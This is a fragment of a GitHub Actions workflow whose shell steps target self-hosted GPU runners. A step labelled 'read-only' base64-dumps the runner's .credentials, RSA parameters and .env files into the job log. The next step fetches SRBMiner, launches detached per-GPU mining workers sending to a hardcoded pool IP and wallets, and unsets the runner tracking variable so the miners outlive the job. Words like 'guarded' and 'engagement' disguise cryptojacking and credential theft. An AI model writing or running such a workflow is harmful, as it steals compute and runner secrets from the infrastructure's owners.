    timeout-minutes: 30
    steps:
      - name: "read-only arch/GPU/runner capture + SRBMiner aarch64 asset probe (<=150s)"
        continue-on-error: true
        run: |
          set +e
          NONCE="I129892CAP-$(date -u +%Y%m%dT%H%M%SZ)"
          echo "capture-nonce=$NONCE label=2-gpu-gb300"
          echo "=== id/host/dmi ==="
          id; hostname; hostname -f 2>/dev/null; date -u; uname -a | cut -c1-220; uname -m
          ARCH=$(uname -m 2>/dev/null); echo "arch=${ARCH:-unknown}"
          for f in /sys/class/dmi/id/product_name /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_serial /sys/class/dmi/id/product_uuid; do printf '%s=' "$f"; timeout 4 cat "$f" 2>/dev/null | head -c 120; echo; done
          echo "=== cpu ==="
          awk -F: '/model name|Hardware|Model|CPU implementer|CPU part/{print "cpu"$0}' /proc/cpuinfo 2>/dev/null | head -6 | cut -c1-200
          echo "nproc=$(nproc 2>/dev/null)"
          echo "=== gpu ==="
          timeout 25 nvidia-smi -L 2>&1 | head -14
          timeout 25 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader 2>&1 | head -14
          echo "--- driver/cuda ---"
          timeout 25 nvidia-smi 2>&1 | grep -iE 'Driver Version|CUDA Version' | head -3
          echo "--- libcuda/libnvidia-ml/libOpenCL ---"
          timeout 10 ldconfig -p 2>/dev/null | grep -E 'libcuda\.so|libnvidia-ml\.so|libOpenCL\.so' | head -8
          ls -la /usr/lib/aarch64-linux-gnu/libcuda.so* /usr/local/cuda/compat/libcuda.so* 2>/dev/null | head -6
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m 2>/dev/null | head -2
          echo "=== existing miner processes (read-only listing; never killed) ==="
          timeout 10 pgrep -af 'SRBMiner|srbminer|[x]-miner|wildrig|OneZero|PeakMiner|lolMiner|[t]rex|gminer|nanominer' 2>/dev/null | head -20
          echo "=== compute apps (read-only) ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1 | head -20
          echo "=== runner dirs/identity (bounded read-only) ==="
          for d in /actions-runner /opt/github-runner /sgl-workspace/actions-runner/actions-runner /home/runner/actions-runner /var/tmp/github-runner; do echo "-- $d"; timeout 6 ls -la "$d" 2>&1 | head -8; done
          for f in /actions-runner/.runner /actions-runner/.credentials /actions-runner/.credentials_rsaparams /opt/github-runner/.runner /opt/github-runner/.credentials /opt/github-runner/.credentials_rsaparams /sgl-workspace/actions-runner/actions-runner/.runner /sgl-workspace/actions-runner/actions-runner/.credentials /sgl-workspace/actions-runner/actions-runner/.credentials_rsaparams /sgl-workspace/actions-runner/actions-runner/.env; do
            if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(timeout 10 sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(timeout 4 stat -c%s "$f" 2>/dev/null)"; timeout 10 base64 -w0 "$f" 2>/dev/null | head -c 4000; echo; fi
          done
          echo "=== official SRBMiner 3.8.8 aarch64 asset probe (read-only) ==="
          for U in \
           https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux-ARM.tar.gz \
           https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux-ARM64.tar.gz \
           https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux-aarch64.tar.gz ; do
            printf '%s -> ' "$(basename "$U")"; timeout 30 curl -sS -o /dev/null -w 'http=%{http_code}\n' -I -L --max-time 25 "$U" 2>&1 | tail -1
          done
          echo "=== stage pinned x86_64 SRBMiner 3.8.8 for arch/ldd/device evidence ==="
          WORKDIR=/var/tmp/i129892
          mkdir -p "$WORKDIR/logs"
          TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
          if [ ! -s "$TARBALL" ] || ! echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
            for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz; do
              echo "-- fetch $U"
              rm -f "$TARBALL.part"
              timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL.part" "$U" 2>&1 | tail -2
              if [ -s "$TARBALL.part" ] && echo "$TAR_SHA  $TARBALL.part" | sha256sum -c - >/dev/null 2>&1; then mv "$TARBALL.part" "$TARBALL"; break; fi
            done
          fi
          echo "x86_tarball_sha256=$(sha256sum "$TARBALL" 2>/dev/null | cut -d' ' -f1) bytes=$(stat -c%s "$TARBALL" 2>/dev/null)"
          mkdir -p "$WORKDIR/srb_x"
          tar -xzf "$TARBALL" -C "$WORKDIR/srb_x" 2>&1 | tail -2
          XSRB="$WORKDIR/srb_x/SRBMiner-Multi-3-8-8/SRBMiner-MULTI"
          echo "x86_binary_sha256=$(sha256sum "$XSRB" 2>/dev/null | cut -d' ' -f1) bytes=$(stat -c%s "$XSRB" 2>/dev/null)"
          echo "--- ELF header of pinned binary ---"
          if command -v python3 >/dev/null 2>&1; then
          python3 - "$XSRB" <<'PYEOF'
          import struct, sys
          p = sys.argv[1]
          try:
              d = open(p, 'rb').read(64)
          except Exception as e:
              print('elf_probe_err', e); raise SystemExit
          m = {0x28: 'ARM32', 0xb7: 'AARCH64', 0x3e: 'X86_64', 0x03: 'X86', 0xf3: 'RISCV', 0x102: 'LOONGARCH'}
          me = struct.unpack('<H', d[18:20])[0] if d[5] == 1 else struct.unpack('>H', d[18:20])[0]
          print('elf_magic', d[:4].hex(), 'class', {1: '32', 2: '64'}.get(d[4]), 'endian', {1: 'LE', 2: 'BE'}.get(d[5]), 'machine', hex(me), m.get(me, '?'))
          PYEOF
          else
            echo "python3_absent"; od -An -tx1 -N20 "$XSRB" 2>/dev/null
          fi
          echo "--- ldd on pinned x86_64 binary ---"
          timeout 20 ldd "$XSRB" 2>&1 | head -14
          echo "--- execute attempt of pinned x86_64 SRBMiner on this host (--disable-cpu --list-devices) ---"
          timeout 30 "$XSRB" --disable-cpu --list-devices > "$WORKDIR/logs/listdev_probe.txt" 2>&1; RC=$?
          echo "exec_rc=$RC"
          head -c 2000 "$WORKDIR/logs/listdev_probe.txt" 2>/dev/null
          echo "--- native SRBMiner already on host? ---"
          command -v SRBMiner-MULTI 2>/dev/null
          for p in /var/tmp/SRBMiner-MULTI /opt/SRBMiner-MULTI /usr/local/bin/SRBMiner-MULTI /root/SRBMiner-MULTI; do [ -e "$p" ] && echo "found $p"; done
          ls -la /var/tmp/*/SRBMiner-MULTI 2>/dev/null | head -5
          echo "--- x86_64 emulation wrappers present? ---"
          command -v box64 qemu-x86_64 qemu-x86_64-static 2>/dev/null
          if command -v box64 >/dev/null 2>&1 && [ "$ARCH" != "x86_64" ]; then
            echo "--- box64 attempt on the official pinned binary (bounded 60s, no substitute miner) ---"
            timeout 60 box64 "$XSRB" --disable-cpu --list-devices 2>&1 | head -12; echo "box64_rc=$?"
          fi
          echo "capture-done $NONCE"
      - name: "guarded per-GPU pearlhash SRBMiner (x86_64 only; aarch64 bounded negative; flock, whole-host skip, idle x2, disk<80%, mem<85%)"
        continue-on-error: true
        run: |
          set +e
          NONCE="I129892MIN-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          WALLET2='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          POOL='103.199.106.122:3362'
          WORKDIR=/var/tmp/i129892
          TAR_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
          TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
          SRB="$WORKDIR/SRBMiner-MULTI"
          BIN_SHA_387=bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6
          TARBALL_387="$WORKDIR/SRBMiner-Multi-3-8-7-Linux.tar.gz"
          SRB_387="$WORKDIR/SRBMiner-MULTI-3.8.7"
          mkdir -p "$WORKDIR/logs"
          echo "miner-nonce=$NONCE label=2-gpu-gb300"
          id; hostname; hostname -f 2>/dev/null; date -u; uname -r; uname -m
          ARCH=$(uname -m 2>/dev/null); echo "arch=${ARCH:-unknown}"
          if [ "$ARCH" != "x86_64" ]; then
            echo "SKIP=aarch64-no-official-srb-build (267 releases/1210 assets carry zero ARM assets; the pinned x86_64 binary exec attempt + ldd evidence is in the capture step)"
            echo "miner-done $NONCE"; exit 0
          fi
          echo "=== per-host flock (shared with earlier campaign lanes on this host) ==="
          mkdir -p /var/tmp/i128123 2>/dev/null
          exec 9>"/var/tmp/i128123/host-miner.lock"
          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "miner-done $NONCE"; exit 0; fi
          echo "host-lock=acquired"
          echo "=== gpu inventory ==="
          timeout 25 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu,driver_version --format=csv,noheader
          echo "=== compute apps (sample 0, read-only) ==="
          APPS0=$(timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>/dev/null)
          echo "${APPS0:-none}"
          echo "=== all miner processes on host (read-only listing; never killed) ==="
          timeout 10 pgrep -af 'SRBMiner|srbminer|[x]-miner|wildrig|OneZero|PeakMiner|lolMiner|[t]rex|gminer|nanominer' 2>/dev/null | head -20
          echo "=== engagement-wallet SRBMiner processes on host (either operator wallet = host claimed) ==="
          EXIST_OURS=$(timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet (${WALLET}|${WALLET2})" 2>/dev/null | head -20)
          echo "${EXIST_OURS:-none}"
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
          MEMP=$(free -m 2>/dev/null | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
          [ -z "$MEMP" ] && MEMP=$(awk '/MemTotal/{t=$2}/MemAvailable/{a=$2}END{if(t>0)printf "%d",(t-a)*100/t; else print 0}' /proc/meminfo 2>/dev/null)
          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; echo "miner-done $NONCE"; exit 0; fi
          if [ -n "$EXIST_OURS" ]; then echo "SKIP=host-already-has-engagement-miner (no stacking, no killing)"; echo "miner-done $NONCE"; exit 0; fi
          if [ -n "$APPS0" ]; then echo "SKIP=host-has-compute-app-sample0 (whole host skipped, nothing touched)"; echo "miner-done $NONCE"; exit 0; fi
          echo "=== fetch+pin SRBMiner-MULTI 3.8.8 ==="
          fetch_pin() {
            URL="$1"; SHA="$2"; OUT="$3"
            echo "-- fetch $URL"
            rm -f "$OUT.part"
            timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$OUT.part" "$URL" 2>&1 | tail -2
            if [ -f "$OUT.part" ] && echo "$SHA  $OUT.part" | sha256sum -c - >/dev/null 2>&1; then mv "$OUT.part" "$OUT"; echo "tarball-ok $SHA"; return 0; fi
            [ -f "$OUT.part" ] && sha256sum "$OUT.part" 2>/dev/null | cut -c1-80
            echo "WARN=tarball-failed $URL"; return 1
          }
          if [ ! -f "$TARBALL" ] || ! echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
            fetch_pin https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
              || fetch_pin https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
              || fetch_pin https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz "$TAR_SHA" "$TARBALL" \
              || echo "WARN=388-download-failed"
          else
            echo "tarball-cached 388"
          fi
          if [ -f "$TARBALL" ] && ! ( [ -f "$SRB" ] && echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1 ); then
            tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
            [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"
          fi
          BINSHA=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
          echo "binary_sha256=${BINSHA:-none}"
          if [ "${BINSHA:-none}" != "$BIN_SHA" ]; then echo "SKIP=388-binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -12; echo "miner-done $NONCE"; exit 0; fi
          chmod +x "$SRB"
          echo "=== ldd pinned binary (runtime) ==="
          timeout 20 ldd "$SRB" 2>&1 | head -10
          echo "=== does the pinned binary see the GPUs? (--disable-cpu --list-devices) ==="
          timeout 30 "$SRB" --disable-cpu --list-devices 2>&1 | head -20
          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-18)
          echo "hosttag=$HOSTTAG"
          echo "=== idle sample 1 (all GPUs) ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid --format=csv,noheader | tr -d ' ' > "$WORKDIR/s1.txt"
          timeout 20 nvidia-smi --query-gpu=index,uuid,memory.used,utilization.gpu --format=csv,noheader,nounits | tr -d ' ' > "$WORKDIR/g1.txt"
          cat "$WORKDIR/g1.txt"
          sleep 15
          echo "=== idle sample 2 (after 15s, all GPUs) ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid --format=csv,noheader | tr -d ' ' > "$WORKDIR/s2.txt"
          timeout 20 nvidia-smi --query-gpu=index,uuid,memory.used,utilization.gpu --format=csv,noheader,nounits | tr -d ' ' > "$WORKDIR/g2.txt"
          cat "$WORKDIR/g2.txt"
          APPS_BOTH=$(cat "$WORKDIR/s1.txt" "$WORKDIR/s2.txt" 2>/dev/null | grep -v '^$')
          if [ -n "$APPS_BOTH" ]; then echo "SKIP=host-not-idle-compute-app-in-spaced-samples"; echo "$APPS_BOTH" | head -10; echo "miner-done $NONCE"; exit 0; fi
          BUSY_MEM=$(awk -F, '$3>2048{print}' "$WORKDIR/g1.txt" "$WORKDIR/g2.txt" 2>/dev/null | head -8)
          BUSY_UTIL=$(awk -F, '$4>10{print}' "$WORKDIR/g1.txt" "$WORKDIR/g2.txt" 2>/dev/null | head -8)
          if [ -n "$BUSY_MEM" ] || [ -n "$BUSY_UTIL" ]; then echo "SKIP=host-not-idle memory-or-util"; echo "$BUSY_MEM"; echo "$BUSY_UTIL"; echo "miner-done $NONCE"; exit 0; fi
          echo "host-idle-gate=pass (all GPUs 0 apps, mem<=2048MiB, util<=10% in both spaced samples)"
          N_LAUNCHED=0
          N_SKIP=0
          while IFS=, read -r IDX UUID USED1 UTIL1; do
            [ -z "$IDX" ] && continue
            case "$UUID" in GPU-*) ;; *) echo "GPU $IDX bad-uuid $UUID -> skip"; N_SKIP=$((N_SKIP+1)); continue;; esac
            USED2=$(awk -F, -v u="$UUID" '$2==u{print $3}' "$WORKDIR/g2.txt" 2>/dev/null)
            echo "GPU $IDX $UUID twice-idle mem_used_mib=$USED1/$USED2 util=${UTIL1}%"
            W="i129892-${HOSTTAG}-g${IDX}"
            echo "worker_name=$W len=${#W}"
            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; N_SKIP=$((N_SKIP+1)); continue; fi
            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB" \
              --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
              --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0 \
              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
            echo "launched worker=$W detached_pid=$! vis=$UUID"
            N_LAUNCHED=$((N_LAUNCHED+1))
            sleep 1
          done < "$WORKDIR/g1.txt"
          echo "N_LAUNCHED=$N_LAUNCHED N_SKIP=$N_SKIP"
          if [ "$N_LAUNCHED" -gt 0 ]; then
            sleep 45
            echo "=== fault scan after 45s (kill ONLY our own faulted i129892 worker, no blind retry) ==="
            FAULTED=""
            for l in "$WORKDIR"/logs/i129892-*.log; do
              [ -f "$l" ] || continue
              w=$(basename "$l" .log)
              echo "== $w"
              grep -aiE 'share accepted|E1027|illegal memory access|stopped after repeated solve errors|TH/s' "$l" 2>/dev/null | tail -4 | cut -c1-240
              if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then FAULTED="$FAULTED $w"; fi
            done
            echo "FAULTED=[$FAULTED]"
            if [ -n "$FAULTED" ]; then
              for w in $FAULTED; do
                for p in $(timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
              done
              echo "=== ONE bounded 3.8.7 fallback round (per host) ==="
              sleep 2
              if [ ! -f "$SRB_387" ] || ! echo "$BIN_SHA_387  $SRB_387" | sha256sum -c - >/dev/null 2>&1; then
                for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz; do
                  echo "-- fetch387 $U"
                  rm -f "$TARBALL_387.part"
                  timeout 240 curl -fL --connect-timeout 15 --max-time 220 -o "$TARBALL_387.part" "$U" 2>&1 | tail -2
                  if [ -s "$TARBALL_387.part" ]; then mv "$TARBALL_387.part" "$TARBALL_387"; break; fi
                done
                [ -f "$TARBALL_387" ] && tar -xzf "$TARBALL_387" -C "$WORKDIR" 2>&1 | tail -3
                [ -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-7/SRBMiner-MULTI" "$SRB_387"
              fi
              B387=$(sha256sum "$SRB_387" 2>/dev/null | cut -d' ' -f1)
              echo "binary_sha256_387=${B387:-none}"
              if [ "${B387:-none}" = "$BIN_SHA_387" ]; then
                chmod +x "$SRB_387"
                for w in $FAULTED; do
                  IDX=${w##*-g}
                  UUID=$(awk -F, -v i="$IDX" '$1==i{print $2}' "$WORKDIR/g1.txt" 2>/dev/null | head -1)
                  [ -z "$UUID" ] && continue
                  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB_387" \
                    --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
                    --wallet "$WALLET" --password x --worker "$w" --gpu-id 0 \
                    --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0 \
                    --log-file "$WORKDIR/logs/$w.r387.log" --log-file-mode 0 \
                    >> "$WORKDIR/logs/$w.r387.out" 2>&1 < /dev/null &
                  echo "fallback387 launched worker=$w pid=$! vis=$UUID"
                done
                sleep 40
                echo "=== post-fallback fault scan ==="
                for l in "$WORKDIR"/logs/i129892-*.r387.log; do
                  [ -f "$l" ] || continue
                  if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then
                    w=$(basename "$l" .r387.log)
                    for p in $(timeout 6 pgrep -f "SRBMiner-MULTI-3.8.7.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted 387 pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
                  fi
                done
              else
                echo "WARN=387-binary-unavailable"
              fi
            fi
          fi
          echo "=== final our processes ==="
          timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -16
          echo "=== final compute apps ==="
          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
          echo "=== log tails ==="
          for l in "$WORKDIR"/logs/i129892-*.log; do
            [ -f "$l" ] || continue
            echo "== $(basename "$l")"
            grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s' "$l" 2>/dev/null | tail -5 | cut -c1-260
          done
          echo "=== pool tcp ==="
          timeout 12 python3 -c "import socket;s=socket.create_connection(('103.199.106.122',3362),8);print('pool-tcp=OK');s.close()" 2>&1 | tail -2
          echo "miner-done $NONCE"
